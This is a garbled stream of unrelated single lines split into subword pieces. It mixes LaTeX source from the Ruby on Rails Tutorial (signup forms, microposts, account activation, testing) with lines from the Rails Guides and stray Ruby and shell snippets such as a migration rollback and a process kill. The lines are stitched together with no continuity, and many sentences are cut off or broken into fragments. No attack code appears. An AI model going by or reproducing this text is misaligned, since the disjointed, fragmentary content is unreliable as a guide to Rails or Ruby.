▁A lthough ▁the ▁ ultimate ▁goal ▁of ▁the ▁next ▁three ▁chapter s ▁is ▁to ▁make ▁a ▁signup ▁page ▁for ▁our ▁site ▁( as ▁ mock ed ▁up ▁in ▁Figure ~\ ref { fig : signup _ mockup _ preview }), ▁it ▁would ▁do ▁little ▁good ▁now ▁to ▁accept ▁information ▁for ▁new ▁users : ▁we ▁don ' t ▁current ly ▁have ▁any ▁place ▁to ▁put ▁it .
▁unless ▁value ▁= ~ ▁ / \ A ( [ ^ @ \ s ] + ) @ ( ( ? : [ - a - z 0 - 9 ] + \ ▖) + [ a - z ] { 2, }) \ z / i
▁This ▁destroy s ▁the ▁ associated ▁objects ▁if ▁they ▁are ▁ associated ▁with ▁` dependent : ▁: destroy `, ▁delete s ▁them ▁directly ▁from ▁the ▁database ▁if ▁` dependent : ▁: delete _ all `, ▁and ▁otherwise ▁set s ▁their ▁foreign ▁keys ▁to ▁` NULL ` .
▁We ' ll ▁start ▁by ▁adding ▁a ▁delete ▁link ▁for ▁each ▁user ▁on ▁the ▁users ▁index ▁page , ▁restrict ing ▁access ▁to ▁ administrative ▁users .
▁For ▁more ▁complex ▁examples ▁such ▁as ▁defin ing ▁alter n ate ▁character ▁set s ▁or ╼ self - en coding ▁text ▁first , ▁please ▁refer ▁to ▁the ╼[ Mail ]( https :// github ▖ com / m i k el / mail ) ▁library .
▁The ▁development ▁ dependencies ▁for ▁the ▁gem ▁will ▁only ▁be ▁used ╼ when ▁the ▁tests ▁for ▁the ▁engine ▁are ▁running .
▁* ▁FROM ▁" users " ▁WHERE ▁" users "▖" state " ▁= ▁' pending ' ▁ AND ▁" users "▖" state " ▁= ▁' active '
▁The ▁ alternative --- deploying ▁only ▁after ▁ lab or i ous ▁effort ▁ se al ed ▁a way ▁in ▁a ▁development ▁environment --- of t en ▁lead s ▁to ▁ ter r ible ▁integration ▁ head a ch es ▁when ▁ la un ch ▁time ▁comes
▁in ▁Listing ~\ ref { code : static _ page _ routes } ▁and
▁P lease ▁avoid ▁terms ▁like ╼ " t ru th y ", ▁Ruby ▁defines ▁what ▁is ▁true ▁and ▁false ▁in ▁the ▁language , ▁and ▁thus ▁those ╼ words ▁have ▁a ▁technical ▁meaning ▁and ▁need ▁no ▁sub st it ute s .
▁Create s ▁a ▁text ▁input ▁are a ; ▁use ▁a ▁text area ▁for ▁longer ▁text ▁input s ▁such ▁as ▁blog ▁posts ▁or ▁ description s .
▁< a ▁ href ="/ articles /1 " ▁data - remote =" true "> an ▁article </ a >
▁This ▁means ▁that ▁any ▁field ▁with ▁an ▁error ▁end s ▁up ▁with ▁a ▁2 ▁p i x el ▁red ▁b order .
▁Cucumber ▁features ▁to ▁test ▁user ▁signin .
▁It ▁is ▁recommended ▁to ▁ _ use ▁ RedCloth ▁in ▁combination ▁with ▁a ▁ white list ▁input ▁filter _ , ▁as ▁describe d ▁in ▁the ▁countermeasure s ▁again st ▁XSS ▁section .
▁ ╼ ▁$ ▁p kill ▁- 9 ▁- f ▁ spring
▁You ▁can ▁now ▁run ▁the ▁tests ▁as ▁you ▁did ▁for ▁` sqlite 3 ` ▖
▁Fin ally , ▁note ▁that ▁Listing ~\ ref { code : signup _ with _ account _ activation _ test } ▁re store s ▁the ▁lines ▁we ▁comment ed ▁out ▁in ▁Listing ~\ ref { code : comment _ out _ failing _ tests } .
▁The ▁rest ▁of ▁this ▁section ▁is ▁d ed icated ▁to ▁tak ing ▁a ▁ w h ir l w in d ▁to ur ▁through ▁these ▁user ▁pages .
▁To ▁avoid ▁this ▁in con ve n i ence , ▁we ▁can ▁use ▁\ href { https :// github ▖ com / guard / guard }{\ emph { Guard } } ▁to ▁automate ▁the ▁running ▁of ▁the ▁tests .
▁As ▁you ▁get ▁more ▁ com for table ▁with ▁testing , ▁you ▁m ight ▁find ▁that ▁it ' s ▁useful ▁to ▁write ▁integration ▁tests ▁before ▁writing ▁the ▁application ▁code ▁instead ▁of ▁after .
▁For ▁CSS ▁files , ▁this ▁is ▁done ▁by ▁remov ing ▁whitespace ▁and ▁comments ▖
▁Ruby ▁also ▁has ▁an ▁explicit ▁return ▁option ; ▁the ▁following ▁function ▁is ▁equivalent ▁to ▁the ▁one ▁above :
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ model _ forget } .
▁-> ▁0▖0 0 17 s
▁config ▖ console ▁= ▁P ry
▁config ▖ action _ controller ▖ asset _ host ▁= ▁' my cdn subdomain ▖ fi ctional - cdn ▖ com '
▁### ▁ Adding ▁More ▁RESTful ▁Action s
▁scope ▁: active , ▁-> ▁ { ▁where ▁state : ▁' active ' ▁ }
▁The ▁result ▁of ▁adding ▁these ▁ additional ▁check s ▁appears ▁in ▁Listing ~\ ref { code : jquery _ file _ test } .
▁You ▁are ▁not ▁free ▁to ▁use ▁just ▁any ▁name ▁for ▁your ▁associations ▖
▁module _ name ▁= ▁name ▖ s ub ( / Controller $ / , ▁ '')
▁Action ▁Mailer ▁handle s ▁the ▁ auto ▁encoding ▁of ▁ multi by te ▁characters ▁inside ▁of ╼ headers ▁and ▁ bo d ies .
▁Action ▁Mailer
▁ s ▁# ▁=> ▁"< script > ▖▖▖ </ script > "
▁To ▁define ▁one , ▁open ╼` app / models / blorgh / article ▖ rb ` ▁and ▁add ▁this ▁line ▁into ▁the ▁model :
▁ listing }╼╼\ subsection { Log in ▁with ▁remember ing } ▁% ▁( fold )╼\ label { sec : login _ with _ remember ing }╼╼
▁All ▁that ▁re main s ▁is ▁to ▁add ▁a ▁so cial ▁layer ▁by ▁let ting ▁users ▁follow ▁each ▁other .
▁ Destroy ing ▁a ▁session ▁( user ▁ logout ) .
▁We ' ll ▁get ▁the ▁test ▁to ▁pass ▁using ▁a ▁Rails ▁method ▁called ▁\ k ode { default \_ scope }, ▁which ▁a mong ▁other ▁things ▁can ▁be ▁used ▁to ▁set ▁the ▁default ▁order ▁in ▁which ▁elements ▁are ▁retrieved ▁from ▁the ▁database .
▁to ▁this ▁code :
▁For ▁example , ▁the ▁file ▁cache ▁store ▁ de serialize s ▁this ▁way :
▁ ╼ ▁$ ▁rake ▁db : migrate ▁ VERSION = 0
▁end { enumerate }╼╼ ▁% ▁subsection ▁the _ flash ▁( end )╼╼ ▁\ subsection { The ▁first ▁signup } ▁% ▁( fold )╼ ▁\ label { sec : the _ first _ signup }╼╼
▁| ▁| ▁50 2 ▁| ▁: bad _ g ate way ▁|
▁as ▁show n ▁in ▁Listing ~\ ref { code : relationships _ migration } .
▁We ' ll ▁also ▁plan ▁to ▁make ▁actions ▁for ▁a ▁Home ▁page , ▁a ▁Help ▁page , ▁and ▁an ▁About ▁page , ▁design at ed ▁by ▁the ▁lower - case ▁action ▁names ▁\ k ode { home }, ▁\ k ode { help }, ▁and ▁\ k ode { about } .
▁A ▁test ▁for ▁a ▁valid ▁( n on blank ) ▁remember ▁token .
▁ / microposts
▁As ▁of ▁this ▁writing , ▁those ▁difference s ▁are ▁not ▁relevant , ▁but ▁in ▁the ▁future , ▁as ▁the ▁current ▁Rails ▁version ▁ div er ge s ▁from ▁the ▁one ▁used ▁in ▁this ▁tutorial , ▁these ▁difference s ▁may ▁become ▁significant .
▁If ▁the ▁code ▁in ▁Listing ~\ ref { code : micropost _ dependency } ▁is ▁working ▁correctly , ▁the ▁test ▁suite ▁should ▁ still ▁be ▁\ passing :
▁We ▁can ▁get ▁started ▁by ▁ generating ▁a ▁template ▁test , ▁which ▁we ' ll ▁call ▁\ k ode { site \_ layout } :
▁In ▁this ▁case , ▁we ▁want ▁to ▁both ▁allow ▁and ▁require ▁the ▁` title ` ▁and ╼` text ` ▁parameters ▁for ▁valid ▁use ▁of ▁` create ` ▖
▁### ▁Active ▁Support ▁With in ▁a ▁Ruby ▁on ▁Rails ▁Application
▁Having ▁complete d ▁account ▁activation ▁( and ▁there by ▁verifie d ▁the ▁user ' s ▁email ▁address ), ▁we ' re ▁now ▁in ▁a ▁good ▁position ▁to ▁handle ▁the ▁common ▁case ▁of ▁users ▁for getting ▁their ▁passwords .
▁We ' ll ▁start ▁by ▁adding ▁a ▁`` global ly ▁recognize d ▁ avatar '' , ▁or ▁\ href { http :// gravatar ▖ com /}{ Gravatar }, ▁to ▁the ▁user ▁profile
▁The ▁\ k ode { Gemfile } ▁needed ▁to ▁use ▁PostgreSQL ▁instead ▁of ▁SQLite .
▁( As ▁noted ▁in ▁that ▁section , ▁this ▁involve s ▁following ▁the ▁instructions ▁in ▁the ▁\ href { http :// git - s cm ▖ com / book / en / getting - started - installing - git } { Installing ▁Git ▁section ▁of ▁\ emph { Pro ▁Git } } ▖)
▁\ subsection { Micropost ▁validations } ▁% ▁( fold )╼ ▁\ label { sec : micropost _ validations }╼╼
▁ RVM ▁Bundler ▁integration
▁( O f ▁course , ▁even ▁the ▁ subselect ▁won ' t ▁ scale ▁for ever .
▁| ▁`: last _ word _ connect or ` ▁| ▁` support ▖ array ▖ last _ word _ connect or ` ▁|
▁This ▁method ▁accept s ▁** no ** ▁arguments .
▁This ▁shows ▁how ▁to ▁run ▁one ▁( and ▁only ▁one ) ▁test ▁file ▁using ▁the ▁argument ▁\ k ode { TE ST } ▁and ▁the ▁full ▁path ▁to ▁the ▁file .
▁render ▁xml : ▁ photo , ▁location : ▁ photo _ url ( photo )
▁It ▁stand s ▁to ▁reason ▁that , ▁if ▁a ▁user ▁is ▁destroyed , ▁the ▁user ' s ▁microposts ▁should ▁be ▁destroyed ▁as ▁well .
▁To ▁ suppress ▁leading ▁and ▁ tr ailing ▁whitespace s , ▁you ▁can ▁use ▁`< % - ` ▁` - % >` ▁inter change ably ▁with ▁`< % ` ▁and ▁` % >` .
▁#### ▁Using ▁ Partial s ▁to ▁ s im p li fy ▁View s
▁method : ▁: delete ,
▁An ▁improve d ▁\ k ode { README } ▁file ▁for ▁the ▁sample ▁app .
▁The ▁User ▁mailer ▁test ▁generated ▁by ▁Rails .
▁By ▁the ▁end ▁of ▁this ▁section , ▁all ▁three ▁of ▁our ▁static ▁pages ▁will ▁have ▁title s ▁of ▁the ▁form ▁`` < page ▁name > ▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App '' , ▁where ▁the ▁first ▁part ▁of ▁the ▁title ▁will ▁var y ▁depending ▁on ▁the ▁page ▁( Table ~\ ref { table : static _ pages }) .
▁invoke ▁ scss
▁When ▁making ▁a ▁change ▁of ▁this ▁nature , ▁it ' s ▁a ▁good ▁practice ▁to ▁write ▁an ▁\ emph { auto ma ted ▁test } ▁to ▁verify ▁that ▁the ▁feature ▁is ▁implemented ▁correctly .
▁On ce ▁you ' re ▁ satisf i ed ▁with ▁your ▁solution s , ▁you ▁can ▁push ▁up ▁the ▁ exercises ▁branch ▁to ▁a ▁remote ▁repository ▁( if ▁you ' ve ▁set ▁one ▁up ) :
▁# ▁gem ▁' guard - s p or k ', ▁' 1 ▖ 5▖0 '
▁Here ▁I ' ve ▁used ▁\ k ode { number } ▁in ▁place ▁of ~\ k ode { i } ▁just ▁to ▁emphasize ▁that ▁any ▁variable ▁name ▁will ▁do .
▁To ▁make ▁the ▁debug ▁output ▁look ▁nice , ▁we ' ll ▁add ▁some ▁rules ▁to ▁the ▁custom ▁stylesheet ▁created ▁in ▁Chapter ~\ ref { cha : filling _ in _ the _ layout }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : mixin _ and _ debug } .
▁Ou r ▁first ▁step ▁toward ▁a ▁working ▁signup ▁form ▁is ▁adding ▁the ▁code ▁in ▁Listing ~\ ref { code : first _ create _ action } .
▁### ▁` deep _ dup `
▁S ince ▁\ k ode { user \_ params } ▁will ▁only ▁be ▁used ▁internally ▁by ▁the ▁Users ▁controller ▁and ▁need ▁not ▁be ▁expose d ▁to ▁external ▁users ▁via ▁the ▁web , ▁we ' ll ▁make ▁it ▁\ emph { private } ▁using ▁Ruby ' s ▁\ k ode { private } ▁keyword , ▁as ▁show n ▁in ▁Listing ~\ ref { code : create _ action _ strong _ parameters } .
▁You ▁can ▁also ▁use ▁ various ▁find er ▁methods ▁on ▁a ▁relation ▁for ▁perform ing ▁complex ▁ calculations :
▁This ▁is ▁because ▁after ▁redirect s ▁the ▁HTTP ▁standard ▁technical ly ▁requires ▁a ▁full ▁URL , ▁a lthough ▁in ▁most ▁browsers ▁it ▁will ▁work ▁either ▁way .
▁N at ur ally , ▁\ k ode { first } ▁just ▁returns ▁the ▁first ▁user ▁in ▁the ▁database .
▁### ▁config / initializers / session _ store ▖ rb
▁**` : batch _ size ` **
▁As ▁we ▁will ▁see , ▁there ▁is ▁a ▁problem ▁with ▁this ▁approach , ▁and ▁we ' ll ▁learn ▁how ▁to ▁fix ▁it ▁using ▁\ k ode { has \_ many ▁: through } .
▁We ' re ▁only ▁concern ed ▁with ▁the ▁behavior ▁experience d ▁when ▁using ▁the ▁full ▁default ╼ Rails ▁ stack .
▁**` ActionDispatch :: Callbacks ` **
▁create ▁app / views / blorgh / articles / show ▖ html ▖ erb
▁How ▁ detailed ▁you ▁want ▁to ▁make ▁your ▁tests ▁is ▁up ▁to ▁you ; ▁a ▁suggest ed ▁ ul t ra - mini ma list ▁template ▁appears ▁in ▁Listing ~\ ref { code : flash _ test }, ▁which ▁you ▁should ▁complete ▁by ▁replacing ▁\ k ode { FILL \_ IN } ▁with ▁the ▁appropriate ▁code .
▁<%= ▁yield ▁%>
▁Re mov e ▁the ▁duplicate d ▁form ▁code ▁by ▁refactoring ▁the ▁\ k ode { new ▖ html ▖ erb } ▁and ▁\ k ode { edit ▖ html ▖ erb } ▁views ▁to ▁use ▁the ▁partial ▁in ▁Listing ~\ ref { code : new _ edit _ partial } .
▁ ph y s ic i an ▖ patients ▁= ▁ patients
▁def ▁create
▁The ▁default ▁\ k ode { ▖ gitignore } ▁created ▁by ▁the ▁\ k ode { rails } ▁command .
▁The ▁login ▁form ▁with ▁an ▁added ▁`` remember ▁me '' ▁checkbox .
▁#### ▁Link ing ▁to ▁ V ide o s ▁with ▁the ▁` video _ tag `
▁We ▁ got ▁a ▁g li mp se ▁of ▁controllers ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁and ▁will ▁come ▁to ▁a ▁ deep er ▁understanding ▁once ▁we ▁explor e ▁the ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Re presentational _ State _ Transfer } { REST ▁architecture } ▁more ▁fully ▁( start ing ▁in ▁Chapter ~\ ref { cha : modeling _ users }) .
▁Action ▁Mailer ▁supports ▁both ▁plain - text ▁and ▁HTML ▁mail .
▁X ▁= ▁1
▁When ▁hashes ▁are ▁the ▁\ emph { last } ▁argument ▁in ▁a ▁function ▁call , ▁the ▁ curl y ▁braces ▁are ▁optional , ▁so ▁these ▁two ▁are ▁equivalent :
▁as ▁seen ▁in ▁Listing ~\ ref { code : demo _ microposts _ resource } .
▁By ▁following ▁along ▁with ▁this ▁guide , ▁you ' ll ▁create ▁a ▁Rails ▁project ▁called ╼` blog `, ▁a ▁( ve ry ) ▁simple ▁we blog ▖
▁This ▁e t y m o log y ▁also ▁suggest s ▁the ▁pro n un ci ation ▁`` S O O - d oo '' ▁( because ▁the ▁word ▁`` do '' ▁is ▁ pronoun c ed ▁`` d oo '') , ▁a lthough ▁the ▁alter n ate ▁pro n un ci ation ▁`` S O O - do h '' ▁is ▁also ▁common .
▁which ▁we ▁saw ▁before ▁in ▁Section ~\ ref { sec : the _ finished _ signup _ form } .
▁Start ing ▁in ▁Rails ~4▖0 , ▁the ▁preferred ▁method ▁to ▁find ▁by ▁attribute ▁is ▁to ▁use ▁the ▁\ k ode { find \_ by } ▁method ▁instead , ▁passing ▁the ▁attribute ▁as ▁a ▁hash :
▁We ' ll ▁also ▁plan ▁to ▁make ▁actions ▁for ▁a ▁Home ▁page , ▁a ▁Help ▁page , ▁and ▁an ▁About ▁page .
▁ Order ing ▁the ▁microposts ▁with ▁\ k ode { default \_ scope } ▖
▁The ▁HTML ▁ shim ▁take s ▁up ▁three ▁lines ▁and ▁uses ▁we ir d ▁ IE - specific ▁syntax , ▁so ▁it ▁would ▁be ▁nice ▁to ▁t u c k ▁it ▁a way ▁some where ▁on ▁its ▁own .
▁One ▁important ▁c a ve at ▁is ▁that ▁` default _ scope ` ▁will ▁be ▁ prepend ed ▁in ╼` scope ` ▁and ▁` where ` ▁conditions .
▁Note ▁that ▁we ' ve ▁added ▁a ▁link ▁to ▁the ▁signup ▁page ▁for ▁convenience .
▁* ▁` image - path (" rails ▖ png ") ` ▁becomes ▁` " / assets / rails ▖ png " ` .
▁ ╼ ▁end
▁Call ing ▁` dup ` ▁or ▁` clone ` ▁on ▁ safe ▁strings ▁yields ▁ safe ▁strings .
▁* ▁` find _ last _ by _▖▖▖` ▁becomes ▁` where (▖▖▖) ▖ last ` .
▁as ▁show n ▁in ▁Listing ~\ ref { code : generated _ user _ mailer _ preview s } .
▁In ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial }, ▁we ' ll ▁take ▁the ▁( nearly ) ▁p ol ar ▁oppos ite ▁approach : ▁a lthough ▁Chapter ~\ ref { cha : a _ toy _ app } ▁will ▁develop ▁a ▁small ▁toy ▁app ▁using ▁scaffold ing , ▁the ▁ core ▁of ▁the ▁\ emph { Rails ▁Tutorial } ▁is ▁the ▁sample ▁app , ▁which ▁we ' ll ▁start ▁writing ▁in ▁Chapter ~\ ref { cha : static _ pages } .
▁This ▁means ▁that ▁we ▁should ▁remove ▁\ k ode { : user \_ id } ▁from ▁the ▁\ k ode { attr \_ accessible } ▁list , ▁and ▁once ▁we ▁do , ▁the ▁code ▁above ▁will ▁fail .
▁We ▁can ▁eliminate ▁these ▁source s ▁of ▁duplication ▁by ▁tell ing ▁RSpec ▁that ▁\ k ode { page } ▁is ▁the ▁\ emph { subject } ▁of ▁the ▁tests ▁using
▁self ▖ author ▁= ▁Blorgh ▖ author _ class ▖ constantize ▖ find _ or _ create _ by ( name : ▁author _ name )
▁This ▁is ▁a ▁hint ▁that ▁we ▁need ▁to ▁update ▁the ▁other ▁occur r ence s ▁of ▁the ▁error - messages ▁partial , ▁which ▁we ▁used ▁when ▁ signing ▁up ▁users ▁( Listing ~\ ref { code : f _ error _ messages }), ▁reset ting ▁passwords ▁( Listing ~\ ref { code : password _ reset _ form }), ▁and ▁edit ing ▁users ▁( Listing ~\ ref { code : user _ edit _ view }) .
▁The ▁method ▁` to _ xml ` ▁returns ▁a ▁string ▁containing ▁an ▁ XML ▁representation ▁of ▁its ▁receiver :
▁The ▁` delete ` ▁routing ▁method ▁should ▁be ▁used ▁for ▁routes ▁that ▁destroy ╼ resources ▖
▁In ▁Section ~\ ref { sec : a _ user _ class }, ▁we ▁design ed ▁the ▁example ▁User ▁class ▁to ▁take ▁an ▁\ emph { initial i z ation ▁hash } ▁to ▁set ▁the ▁object ▁attributes ; ▁that ▁design ▁choice ▁was ▁m o t i v at ed ▁by ▁Active ▁Record , ▁which ▁allows ▁objects ▁to ▁be ▁initializ ed ▁in ▁the ▁same ▁way :
▁as ▁show n ▁in ▁Listing ~\ ref { code : comment _ out _ footer } .
▁There ▁is ▁no ▁consistent ▁site ▁styling ▁or ▁navigation .
▁With ▁the ▁\ k ode { create } ▁action ▁defined ▁in ▁Listing ~\ ref { code : log _ in _ success }, ▁the ▁login ▁form ▁defined ▁in ▁Listing ~\ ref { code : login _ form } ▁should ▁now ▁be ▁working .
▁A lt er na tive ly , ▁if ▁` return ` ▁is ▁preferred ▁it ▁is ▁recommended ▁to ▁explicitly ▁define ╼ a ▁method :
▁#### # ▁` utc ?
▁╼╼ ▁% ▁section ▁introduction ▁( end )╼╼ ▁\ section { U p ▁and ▁running } ▁% ▁( fold )╼ ▁\ label { sec : up _ and _ running }╼╼
▁In ▁other ▁words , ▁we ▁want ▁to ▁make ▁sure ▁not ▁just ▁that ▁invalid ▁email ▁addresses ▁like ▁\ emph { user @ example , com } ▁are ▁reject ed , ▁but ▁also ▁that ▁valid ▁addresses ▁like ▁\ emph { user @ example ▖ com } ▁are ▁accepted , ▁even ▁after ▁we ▁ im po se ▁the ▁validation ▁constraint .
▁It ▁does ▁not ▁assume ▁that ▁you ▁have ▁any ▁p ri or ▁experience ╼ with ▁Rails ▖
▁S w it ch ed ▁to ▁a ▁new ▁branch ▁' modify - README '
▁ Contribut or ▖ limit (2) ▖ order (: rank )▖ to _ xml ( skip _ type s : ▁true )
▁To ▁get ▁it ▁to ▁\ passing , ▁just ▁un comment ▁the ▁before ▁filter ▁( Listing ~\ ref { code : un comment ed _ before _ filter }) .
